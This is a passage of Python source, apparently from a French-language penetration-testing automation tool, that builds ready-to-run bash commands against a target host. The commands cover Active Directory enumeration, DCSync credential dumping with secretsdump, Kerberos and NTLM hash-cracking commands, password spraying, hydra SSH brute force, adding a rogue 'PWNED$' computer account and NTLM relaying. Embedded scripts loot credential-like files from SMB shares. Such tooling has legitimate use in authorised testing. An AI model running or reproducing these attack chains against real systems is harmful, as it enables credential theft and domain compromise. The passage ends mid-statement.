            f"command -v enum4linux-ng >/dev/null || {{ echo 'enum4linux-ng introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/enum4linux; "
            + (f"enum4linux-ng -A -u {qu} -p {qp} {qt} -oJ {qout}/enum4linux/output 2>&1"
               if u else f"enum4linux-ng -A {qt} -oJ {qout}/enum4linux/output 2>&1")
        ] if t else None,

        "rpcclient_enum": ["bash","-c",
            f"rpcclient -U '' -N {qt} -c 'enumdomusers;enumdomgroups;quit' 2>&1; "
            + (f"rpcclient -U {shell_quote(f'{d}\\\\{u}%{p}')} {qt} "
               f"-c 'enumdomusers;enumdomgroups;getdompwinfo;querydominfo;quit' 2>&1"
               if u and not nt else "true")
        ] if t else None,

        "bloodhound_collect": ["bash","-c",
            f"command -v bloodhound-python >/dev/null || {{ echo 'bloodhound-python introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/bloodhound; cd {qout}/bloodhound; "
            + (f"KRB5CCNAME={qcc} bloodhound-python -u {qu} -k -no-pass "
               f"-d {qd} -c All -dc {qdc} -ns {qt} --dns-tcp 2>&1"
               if cc else
               f"bloodhound-python -u {qu} "
               + (f"-hashes {shell_quote(':' + nt)}" if nt else f"-p {qp}")
               + f" -d {qd} -c All -dc {qdc} -ns {qt} --dns-tcp 2>&1"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "secretsdump": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('secretsdump'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'secretsdump introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"KRB5CCNAME={qcc} $TOOL -k -no-pass {shell_quote(f'{d}/{u}@{t}')} -just-dc-ntlm 2>&1 "
               f"| tee {qout}/attack_checks/secretsdump_dcsync.txt"
               if cc else
               f"$TOOL {shell_quote(f'{d}/{u}')} -hashes {shell_quote(':' + nt)} @{qt} -just-dc-ntlm 2>&1 "
               f"| tee {qout}/attack_checks/secretsdump_dcsync.txt"
               if nt else
               f"$TOOL {shell_quote(f'{d}/{u}:{p}@{t}')} -just-dc-ntlm 2>&1 "
               f"| tee {qout}/attack_checks/secretsdump_dcsync.txt"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "bloodyad_acls": ["bash","-c",
            f"TOOL={shell_quote(get_bloodyad())}; command -v $TOOL >/dev/null || {{ echo 'bloodyAD introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/bloodyad; "
            + (f"echo '=== get writable ===> '; "
               f"$TOOL -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc} --dc-ip {qt} get writable 2>&1 | tee {qout}/bloodyad/writable.txt; "
               f"echo '=== get trusts ===>  '; "
               f"$TOOL -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc} --dc-ip {qt} get trusts 2>&1 | tee {qout}/bloodyad/trusts.txt; "
               f"echo '=== machine account quota ===>  '; "
               f"$TOOL -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc} --dc-ip {qt} get object {qd} --attr ms-DS-MachineAccountQuota 2>&1 | tee {qout}/bloodyad/maq.txt; "
               f"echo '=== shadow creds candidates ===>  '; "
               f"$TOOL -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc} --dc-ip {qt} get object {qd} --attr msDS-KeyCredentialLink 2>&1 | tee {qout}/bloodyad/shadow_creds.txt; "
               f"echo '=== owner / writable OUs ===>  '; "
               f"$TOOL -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc} --dc-ip {qt} get writable --detail 2>&1 | tee {qout}/bloodyad/writable_detail.txt"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "gpo_parse": ["bash","-c",
            f"echo '=== GPP / cpassword ==='; "
            f"find {qout}/downloads -name 'Groups.xml' -o -name 'Services.xml' 2>/dev/null | head -10; "
            f"grep -rHi 'cpassword' {qout}/downloads 2>/dev/null | head -20; "
            f"echo ''; echo '=== Credential patterns ==='; "
            f"grep -rHiE 'password|pwd|secret|apikey' {qout}/downloads 2>/dev/null | head -30"
        ],

        "hash_hints": ["bash","-c",
            "echo '══ AS-REP → hashcat -m 18200 ══'; "
            f"[ -f {qout}/kerberos/asrep_hashes.txt ] && "
            f"  grep -c 'krb5asrep' {qout}/kerberos/asrep_hashes.txt 2>/dev/null "
            "  | xargs -I XARG echo '  XARG hash(es)' || true; "
            "echo 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force'; "
            "echo 'john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt'; "
            "echo ''; echo '══ TGS Kerberoast → hashcat -m 13100 ══'; "
            f"[ -f {qout}/kerberos/tgs_hashes.txt ] && "
            f"  grep -c 'krb5tgs' {qout}/kerberos/tgs_hashes.txt 2>/dev/null "
            "  | xargs -I XARG echo '  XARG hash(es)' || true; "
            "echo 'hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force'; "
            "echo ''; echo '══ NTLM DCSync → hashcat -m 1000 ══'; "
            f"[ -f {qout}/attack_checks/secretsdump_dcsync.txt ] && "
            f"  grep -cE ':[0-9a-f]{{32}}:' {qout}/attack_checks/secretsdump_dcsync.txt 2>/dev/null "
            "  | xargs -I XARG echo '  XARG NTLM(s)' || true; "
            "echo 'cut -d: -f4 dcsync.txt | sort -u > ntlm.txt'; "
            "echo 'hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --force'"
        ],

        "postauth_hints": ["bash","-c",
            f"echo '══ Lateral movement ══'; "
            + (f"echo {shell_quote(psexec_hint)}; "
               f"echo {shell_quote(wmiexec_hint)}; "
               f"echo {shell_quote(evil_hint)}; "
               f"echo {shell_quote(rdp_hint)}; "
               if u else "echo 'User non configuré'; ")
            + f"echo ''; echo '══ Pass-the-Ticket ══'; "
            f"find {qout}/attack_checks -name '*.ccache' 2>/dev/null "
            f"| while read f; do echo \"export KRB5CCNAME=$f\"; done"
        ],

        "password_spray": ["bash","-c",
            f"[ ! -f {qout}/users.txt ] && echo 'users.txt manquant' && exit 1; "
            f"echo \"[!] Spray {qp} sur $(wc -l < {qout}/users.txt) comptes\"; "
            f"echo '[!] Vérifie la politique de verrouillage !'; "
            f"{shell_quote(nxc)} smb {qt} -u {qout}/users.txt -p {qp} -d {qd} --continue-on-success 2>&1"
        ] if t and d and p else None,

        "ssh_banner": ["bash","-c",
            f"nmap -Pn -p 22 --script ssh2-enum-algos,ssh-hostkey {qt} 2>&1 | tee {qout}/attack_checks/ssh_banner.txt"
        ] if t else None,

        "ssh_auth_methods": ["bash","-c",
            f"nmap -Pn -p 22 --script ssh-auth-methods {qt} 2>&1 | tee {qout}/attack_checks/ssh_auth_methods.txt"
        ] if t else None,

        "nfs_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"(command -v showmount >/dev/null && showmount -e {qt}) 2>&1 | tee {qout}/attack_checks/nfs_showmount.txt; "
            f"nmap -Pn -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs {qt} 2>&1 | tee {qout}/attack_checks/nfs_probe.txt"
        ] if t else None,

        "linux_http_fingerprint": ["bash","-c",
            f"curl -ksLI {shell_quote(f'http://{t}')} 2>&1 | tee {qout}/attack_checks/linux_http_headers.txt | head -40; "
            f"curl -ksLI {shell_quote(f'https://{t}')} 2>&1 | tee {qout}/attack_checks/linux_https_headers.txt | head -40; "
            f"(command -v whatweb >/dev/null && whatweb {qt}) 2>&1 | tee {qout}/attack_checks/whatweb.txt | head -40"
        ] if t else None,

        "tls_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"nmap -Pn -p 443,8443 --script ssl-cert,ssl-enum-ciphers {qt} 2>&1 | tee {qout}/attack_checks/tls_probe.txt"
        ] if t else None,

        "web_robots": ["bash","-c",
            f"mkdir -p {qout}/downloads; "
            f"for base in {shell_quote(f'http://{t}')} {shell_quote(f'https://{t}')}; do "
            f"echo \"=== $base/robots.txt ===\"; curl -ksS \"$base/robots.txt\"; echo; "
            f"echo \"=== $base/sitemap.xml ===\"; curl -ksS \"$base/sitemap.xml\"; echo; "
            f"done | tee {qout}/downloads/web_robots.txt | head -200"
        ] if t else None,

        "web_tech_detect": ["bash","-c",
            f"(command -v whatweb >/dev/null && whatweb {qt}) 2>&1 | tee {qout}/attack_checks/web_tech_detect.txt; "
            f"curl -ksLI {shell_quote(f'https://{t}')} 2>&1 | tee -a {qout}/attack_checks/web_tech_detect.txt | head -80; "
            f"curl -ksLI {shell_quote(f'http://{t}')} 2>&1 | tee -a {qout}/attack_checks/web_tech_detect.txt | head -80"
        ] if t else None,

        "web_dir_quick": ["bash","-c",
            f"mkdir -p {qout}/downloads; "
            f"if command -v feroxbuster >/dev/null; then "
            f"  feroxbuster -u {qweb_url} -x php,txt,html -n -d 1 -k --silent -o {qout}/downloads/web_dir_quick.txt 2>&1; "
            f"elif command -v gobuster >/dev/null; then "
            f"  gobuster dir -u {qweb_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -o {qout}/downloads/web_dir_quick.txt 2>&1; "
            f"else echo 'feroxbuster/gobuster manquant'; fi"
        ] if t else None,

        "web_nuclei_safe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"if command -v nuclei >/dev/null; then "
            f"  nuclei -target {qweb_url} -severity info,low,medium -o {qout}/attack_checks/nuclei_safe.txt 2>&1; "
            f"else echo 'nuclei manquant'; fi"
        ] if t else None,

        # ── SMB ─────────────────────────────────────────────────────────
        "smbmap_enum": ["bash","-c",
            f"command -v smbmap >/dev/null || {{ echo 'smbmap manquant'; exit 1; }}; "
            f"command -v smbclient >/dev/null || echo 'smbclient manquant: downloads SMB limites'; "
            f"mkdir -p {qout}/downloads; "
            + (f"OUTFILE={qout}/downloads/smbmap_enum.txt; "
               f"smbmap -H {qt} -u {qu} "
               + (f"-p {shell_quote(':' + nt)} --pth" if nt else f"-p {qp}")
               + f" -d {qd} -r --depth 3 2>&1 | tee \"$OUTFILE\"; "
               + (f"echo '[*] Downloads auto ignores: auth NT hash/PTH non reutilisable via smbclient.'"
                  if nt else
                  f"python3 - <<'PY' \"$OUTFILE\" {qt} {shell_quote(u)} {qp} {qd} {qout}/downloads/smbmap_loot\n"
                  "import pathlib, re, shlex, shutil, subprocess, sys\n"
                  "out_file = pathlib.Path(sys.argv[1])\n"
                  "target = sys.argv[2]\n"
                  "user = sys.argv[3]\n"
                  "password = sys.argv[4]\n"
                  "domain = sys.argv[5]\n"
                  "download_root = pathlib.Path(sys.argv[6])\n"
                  "download_root.mkdir(parents=True, exist_ok=True)\n"
                  "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
                  "cur_share = None\n"
                  "current_dir = ''\n"
                  "candidates = []\n"
                  "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs|kdbx|rdp|ppk|pem|key|db|sqlite|db3|bak|old|backup|sav|zip|7z|rar|tar|gz)$', re.I)\n"
                  "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings|backup|database)', re.I)\n"
                  "for raw in text.splitlines():\n"
                  "    line = raw.rstrip()\n"
                  "    scan = line.strip()\n"
                  "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
                  "    if m_share:\n"
                  "        cur_share = m_share.group(1).strip()\n"
                  "        current_dir = ''\n"
                  "        continue\n"
                  "    if scan.startswith('./') and cur_share:\n"
                  "        shown = scan[2:].strip().replace('//', '/')\n"
                  "        shown = shown.strip('/')\n"
                  "        if shown.lower() == cur_share.lower():\n"
                  "            current_dir = ''\n"
                  "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
                  "            current_dir = shown[len(cur_share):].lstrip('/')\n"
                  "        else:\n"
                  "            current_dir = shown\n"
                  "        continue\n"
                  "    if not cur_share:\n"
                  "        continue\n"
                  "    if re.search(r'\\b(fr|f)--', scan):\n"
                  "        parts = scan.split()\n"
                  "        if not parts:\n"
                  "            continue\n"
                  "        name = parts[-1].strip()\n"
                  "        if not name or name in {'.', '..'}:\n"
                  "            continue\n"
                  "        if ext_re.search(name) or name_re.search(name):\n"
                  "            rel_dir = current_dir\n"
                  "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
                  "            item = (cur_share, rel_path)\n"
                  "            if item not in candidates:\n"
                  "                candidates.append(item)\n"
                  "print('=== smbmap auto-download candidates ===')\n"
                  "downloaded = 0\n"
                  "for share, rel_path in candidates[:20]:\n"
                  "    print(f'[candidate] {share}/{rel_path}')\n"
                  "    if shutil.which('smbclient') is None:\n"
                  "        continue\n"
                  "PY\n"
                  f"python3 - <<'PY' \"$OUTFILE\" {qt} {shell_quote(u)} {qp} {qd} {qout}/downloads/smbmap_loot\n"
                  "import pathlib, re, shlex, shutil, subprocess, sys\n"
                  "out_file = pathlib.Path(sys.argv[1])\n"
                  "target = sys.argv[2]\n"
                  "user = sys.argv[3]\n"
                  "password = sys.argv[4]\n"
                  "domain = sys.argv[5]\n"
                  "download_root = pathlib.Path(sys.argv[6])\n"
                  "download_root.mkdir(parents=True, exist_ok=True)\n"
                  "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
                  "cur_share = None\n"
                  "current_dir = ''\n"
                  "candidates = []\n"
                  "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs|kdbx|rdp|ppk|pem|key|db|sqlite|db3|bak|old|backup|sav|zip|7z|rar|tar|gz)$', re.I)\n"
                  "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings|backup|database)', re.I)\n"
                  "for raw in text.splitlines():\n"
                  "    line = raw.rstrip()\n"
                  "    scan = line.strip()\n"
                  "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
                  "    if m_share:\n"
                  "        cur_share = m_share.group(1).strip()\n"
                  "        current_dir = ''\n"
                  "        continue\n"
                  "    if scan.startswith('./') and cur_share:\n"
                  "        shown = scan[2:].strip().replace('//', '/')\n"
                  "        shown = shown.strip('/')\n"
                  "        if shown.lower() == cur_share.lower():\n"
                  "            current_dir = ''\n"
                  "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
                  "            current_dir = shown[len(cur_share):].lstrip('/')\n"
                  "        else:\n"
                  "            current_dir = shown\n"
                  "        continue\n"
                  "    if not cur_share:\n"
                  "        continue\n"
                  "    if re.search(r'\\b(fr|f)--', scan):\n"
                  "        parts = scan.split()\n"
                  "        if not parts:\n"
                  "            continue\n"
                  "        name = parts[-1].strip()\n"
                  "        if not name or name in {'.', '..'}:\n"
                  "            continue\n"
                  "        if ext_re.search(name) or name_re.search(name):\n"
                  "            rel_dir = current_dir\n"
                  "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
                  "            item = (cur_share, rel_path)\n"
                  "            if item not in candidates:\n"
                  "                candidates.append(item)\n"
                  "if shutil.which('smbclient') is None:\n"
                  "    print('[*] smbclient absent: impossible de telecharger les fichiers candidats.')\n"
                  "    raise SystemExit(0)\n"
                  "downloaded = 0\n"
                  "for share, rel_path in candidates[:20]:\n"
                  "    share_dir = download_root / share\n"
                  "    share_dir.mkdir(parents=True, exist_ok=True)\n"
                  "    remote_dir = '/'.join(rel_path.split('/')[:-1])\n"
                  "    remote_name = rel_path.split('/')[-1]\n"
                  "    cmd = f'prompt OFF; recurse OFF; lcd \"{share_dir}\"; '\n"
                  "    if remote_dir:\n"
                  "        cmd += f'cd \"{remote_dir}\"; '\n"
                  "    cmd += f'get \"{remote_name}\"'\n"
                  "    base = ['smbclient', f'//{target}/{share}', '-U', f'{user}%{password}', '-W', domain, '-c', cmd]\n"
                  "    try:\n"
                  "        proc = subprocess.run(base, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=25)\n"
                  "        if proc.returncode == 0:\n"
                  "            downloaded += 1\n"
                  "            print(f'[downloaded] {share}/{rel_path}')\n"
                  "        else:\n"
                  "            print(f'[skip] {share}/{rel_path} :: {proc.stdout[:120].strip()}')\n"
                  "    except Exception as exc:\n"
                  "        print(f'[skip] {share}/{rel_path} :: {str(exc)[:120]}')\n"
                  "print(f'[summary] downloaded={downloaded} candidates={min(len(candidates),20)} root={download_root}')\n"
                  "PY")
               if u else
               f"OUTFILE={qout}/downloads/smbmap_anon.txt; "
               f"smbmap -H {qt} -u '' -p '' -r --depth 2 2>&1 | tee \"$OUTFILE\"; "
               f"python3 - <<'PY' \"$OUTFILE\" {qt} {qout}/downloads/smbmap_loot_anon\n"
               "import pathlib, re, shutil, subprocess, sys\n"
               "out_file = pathlib.Path(sys.argv[1])\n"
               "target = sys.argv[2]\n"
               "download_root = pathlib.Path(sys.argv[3])\n"
               "download_root.mkdir(parents=True, exist_ok=True)\n"
               "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
               "cur_share = None\n"
               "current_dir = ''\n"
               "candidates = []\n"
               "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs)$', re.I)\n"
               "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings)', re.I)\n"
               "for raw in text.splitlines():\n"
               "    line = raw.rstrip()\n"
               "    scan = line.strip()\n"
               "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
               "    if m_share:\n"
               "        cur_share = m_share.group(1).strip()\n"
               "        current_dir = ''\n"
               "        continue\n"
               "    if scan.startswith('./') and cur_share:\n"
               "        shown = scan[2:].strip().replace('//', '/')\n"
               "        shown = shown.strip('/')\n"
               "        if shown.lower() == cur_share.lower():\n"
               "            current_dir = ''\n"
               "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
               "            current_dir = shown[len(cur_share):].lstrip('/')\n"
               "        else:\n"
               "            current_dir = shown\n"
               "        continue\n"
               "    if not cur_share:\n"
               "        continue\n"
               "    if re.search(r'\\b(fr|f)--', scan):\n"
               "        parts = scan.split()\n"
               "        if not parts:\n"
               "            continue\n"
               "        name = parts[-1].strip()\n"
               "        if not name or name in {'.', '..'}:\n"
               "            continue\n"
               "        if ext_re.search(name) or name_re.search(name):\n"
               "            rel_dir = current_dir\n"
               "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
               "            item = (cur_share, rel_path)\n"
               "            if item not in candidates:\n"
               "                candidates.append(item)\n"
               "if shutil.which('smbclient') is None:\n"
               "    print('[*] smbclient absent: impossible de telecharger les fichiers candidats.')\n"
               "    raise SystemExit(0)\n"
               "downloaded = 0\n"
               "for share, rel_path in candidates[:12]:\n"
               "    share_dir = download_root / share\n"
               "    share_dir.mkdir(parents=True, exist_ok=True)\n"
               "    remote_dir = '/'.join(rel_path.split('/')[:-1])\n"
               "    remote_name = rel_path.split('/')[-1]\n"
               "    cmd = f'prompt OFF; recurse OFF; lcd \"{share_dir}\"; '\n"
               "    if remote_dir:\n"
               "        cmd += f'cd \"{remote_dir}\"; '\n"
               "    cmd += f'get \"{remote_name}\"'\n"
               "    base = ['smbclient', f'//{target}/{share}', '-N', '-c', cmd]\n"
               "    try:\n"
               "        proc = subprocess.run(base, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=20)\n"
               "        if proc.returncode == 0:\n"
               "            downloaded += 1\n"
               "            print(f'[downloaded] {share}/{rel_path}')\n"
               "        else:\n"
               "            print(f'[skip] {share}/{rel_path} :: {proc.stdout[:120].strip()}')\n"
               "    except Exception as exc:\n"
               "        print(f'[skip] {share}/{rel_path} :: {str(exc)[:120]}')\n"
               "print(f'[summary] downloaded={downloaded} candidates={min(len(candidates),12)} root={download_root}')\n"
               "PY")
        ] if t else None,

        # ── Web ──────────────────────────────────────────────────────────
        "ffuf_vhost": ["bash","-c",
            f"command -v ffuf >/dev/null || {{ echo 'ffuf manquant — apt install ffuf'; exit 1; }}; "
            f"mkdir -p {qout}/downloads; "
            f"WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt; "
            f"[ -f $WLIST ] || {{ echo 'SecLists manquant'; exit 1; }}; "
            f"ffuf -w $WLIST -u {qweb_url} "
            f"-H {shell_quote(f'Host: FUZZ.{d if d else t}')} "
            f"-mc 200,301,302,403 -c -t 50 "
            f"-o {qout}/downloads/ffuf_vhost.json -of json 2>&1 | tee {qout}/downloads/ffuf_vhost.txt | head -80"
        ] if t else None,

        "ffuf_dir_fast": ["bash","-c",
            f"command -v ffuf >/dev/null || {{ echo 'ffuf manquant — apt install ffuf'; exit 1; }}; "
            f"mkdir -p {qout}/downloads; "
            f"WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt; "
            f"[ -f $WLIST ] || WLIST=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; "
            f"[ -f $WLIST ] || {{ echo 'Wordlist manquante'; exit 1; }}; "
            f"ffuf -w $WLIST -u {shell_quote(web_url + '/FUZZ')} "
            f"-e .php,.html,.txt,.json,.bak -mc 200,201,204,301,302,403 -c -t 80 -fc 404 "
            f"-o {qout}/downloads/ffuf_dir.json -of json 2>&1 | tee {qout}/downloads/ffuf_dir.txt | head -100"
        ] if t else None,

        "wfuzz_params": ["bash","-c",
            f"command -v wfuzz >/dev/null || {{ echo 'wfuzz manquant — apt install wfuzz'; exit 1; }}; "
            f"mkdir -p {qout}/downloads; "
            f"WLIST=/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt; "
            f"[ -f $WLIST ] || {{ echo 'burp-parameter-names.txt manquant (SecLists requis)'; exit 1; }}; "
            f"wfuzz -c -z file,$WLIST --hc 404 --hh 0 -t 40 "
            f"-o {qout}/downloads/wfuzz_params.txt "
            f"{shell_quote(web_url + '/?FUZZ=test')} 2>&1 | head -100"
        ] if t else None,

        # ── Linux ────────────────────────────────────────────────────────
        "hydra_ssh": ["bash","-c",
            f"command -v hydra >/dev/null || {{ echo 'hydra manquant — apt install hydra'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"hydra -l {qu} -p {qp} ssh://{qt} -t 4 2>&1 | tee {qout}/attack_checks/hydra_ssh.txt"
               if u and p else
               f"WLIST=/usr/share/wordlists/rockyou.txt; "
               f"[ -f $WLIST ] || {{ echo 'rockyou.txt manquant'; exit 1; }}; "
               f"hydra -l {qu if u else 'root'} -P $WLIST ssh://{qt} -t 4 -f 2>&1 | tee {qout}/attack_checks/hydra_ssh.txt"
               if u else
               f"echo 'Configurez au minimum un username dans les credentials'")
        ] if t else None,

        # ── Post-auth (AD escalation) ────────────────────────────────────
        "rbcd_check": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('rbcd'))}; "
            f"command -v $TOOL >/dev/null || {{ echo '[!] impacket-rbcd introuvable — vérifiez votre version impacket'; "
            f"echo 'Alternative bloodyAD :'; "
            f"echo {shell_quote(f'bloodyAD -d {d} -u {u} --host {dc if dc else t} get object <CIBLE> --attr msDS-AllowedToActOnBehalfOfOtherIdentity')}; exit 0; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"$TOOL -delegate-to '<CIBLE$>' -action read "
               + (f"'{d}/{u}:{p}@{t}'" if not nt and not cc else
                  f"'-hashes :{nt} {d}/{u}@{t}'" if nt else
                  f"'-k -no-pass {d}/{u}@{t}'")
               + f" 2>&1 | tee {qout}/attack_checks/rbcd_check.txt"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "dacledit_read": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('dacledit'))}; "
            f"command -v $TOOL >/dev/null || {{ echo '[!] dacledit introuvable'; "
            f"TOOL=$(find /usr/share/doc/python3-impacket /usr/lib/python3 -name 'dacledit.py' 2>/dev/null | head -1); "
            f"[ -z \"$TOOL\" ] && echo 'dacledit.py introuvable — impacket récent requis' && exit 1; "
            f"TOOL=\"python3 $TOOL\"; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"$TOOL -action read -dc-ip {qt} -principal {qu} -target-dn {qdn} "
               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
                  f"{shell_quote(f'{d}/{u}:{p}')}")
               + f" 2>&1 | tee {qout}/attack_checks/dacledit.txt"
               if u and dn else "echo 'User et DN de base requis'")
        ] if t and d else None,

        "owneredit_read": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('owneredit'))}; "
            f"command -v $TOOL >/dev/null || {{ echo '[!] owneredit introuvable'; "
            f"TOOL=$(find /usr/share/doc/python3-impacket /usr/lib/python3 -name 'owneredit.py' 2>/dev/null | head -1); "
            f"[ -z \"$TOOL\" ] && echo 'owneredit.py introuvable — impacket récent requis' && exit 1; "
            f"TOOL=\"python3 $TOOL\"; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"$TOOL -action read -dc-ip {qt} -target {qu} "
               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
                  f"{shell_quote(f'{d}/{u}:{p}')}")
               + f" 2>&1 | tee {qout}/attack_checks/owneredit.txt"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "addcomputer": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('addcomputer'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'impacket-addcomputer introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"$TOOL -dc-ip {qt} -computer-name 'PWNED$' -computer-pass 'Pwned123!' "
               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
                  f"{shell_quote(f'{d}/{u}:{p}')}")
               + f" 2>&1 | tee {qout}/attack_checks/addcomputer.txt; "
               f"echo ''; echo '[*] Utilise PWNED$ / Pwned123! pour RBCD ou Shadow Creds'"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "ntlmrelayx_run": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('ntlmrelayx'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'impacket-ntlmrelayx introuvable'; exit 1; }}; "
            f"TARGETS={qout}/smb_relay_targets.txt; "
            f"[ -f $TARGETS ] || {{ echo '[!] smb_relay_targets.txt absent — lance smb_signing en premier'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '[*] Démarrage ntlmrelayx vers les cibles sans signing SMB...'; "
            f"echo '[*] Utilise Responder ou Coercer pour forcer les authentifications NTLM'; "
            f"if [ \"$(id -u)\" -eq 0 ]; then "
            f"  \"$TOOL\" -tf \"$TARGETS\" -smb2support -socks 2>&1; "
            f"elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
            f"  printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' \"$TOOL\" -tf \"$TARGETS\" -smb2support -socks 2>&1; "
            f"else "
            f"  sudo \"$TOOL\" -tf \"$TARGETS\" -smb2support -socks 2>&1; "
            f"fi | tee {qout}/attack_checks/ntlmrelayx.txt"
        ] if t else None,

        # ── Web attacks ──────────────────────────────────────────────────
        "nikto_scan": ["bash","-c",
            f"command -v nikto >/dev/null || {{ echo 'nikto manquant — apt install nikto'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '[*] Nikto scan sur {web_url} (peut prendre 5-10 min)...'; "
            f"nikto -h {qweb_url} -o {qout}/attack_checks/nikto.txt -Format txt 2>&1 "
            f"| tee {qout}/attack_checks/nikto_live.txt"
        ] if t else None,

        "waf_detect": ["bash","-c",
            f"command -v wafw00f >/dev/null || {{ echo 'wafw00f manquant — pip3 install wafw00f'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== WAF Detection ==='; "
            f"wafw00f {qweb_url} -a 2>&1 | tee {qout}/attack_checks/waf_detect.txt; "
            f"echo ''; echo '=== HTTP headers WAF hints ==='; "
            f"curl -skI --max-time 8 {qweb_url} 2>&1 | grep -iE 'server|x-powered|x-cache|cf-ray|x-sucuri|x-shield|x-waf' "
            f"| tee -a {qout}/attack_checks/waf_detect.txt"
        ] if t else None,

        "cms_scan": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"TECH={qout}/attack_checks/web_tech_detect.txt; "
            f"echo '=== CMS Detection ==='; "
            f"(command -v whatweb >/dev/null && whatweb {qweb_url} 2>&1 | tee {qout}/attack_checks/cms_detect.txt) || "
            f"curl -skL {qweb_url} | grep -iE 'wp-content|wordpress|joomla|drupal|silverstripe|typo3' | head -5; "
            f"if grep -qiE 'WordPress|wp-content' {qout}/attack_checks/cms_detect.txt 2>/dev/null; then "
            f"  echo '[+] WordPress détecté → wpscan'; "
            f"  if command -v wpscan >/dev/null; then "
            f"    wpscan --url {qweb_url} --enumerate u,p,t --plugins-detection aggressive "
            f"    -o {qout}/attack_checks/wpscan.txt 2>&1 | head -150; "
            f"  else echo '[!] wpscan manquant — apt install wpscan ou gem install wpscan'; fi; "
            f"elif grep -qiE 'Drupal|drupal' {qout}/attack_checks/cms_detect.txt 2>/dev/null; then "
            f"  echo '[+] Drupal détecté → droopescan'; "
            f"  if command -v droopescan >/dev/null; then "
            f"    droopescan scan drupal -u {qweb_url} 2>&1 | head -80; "
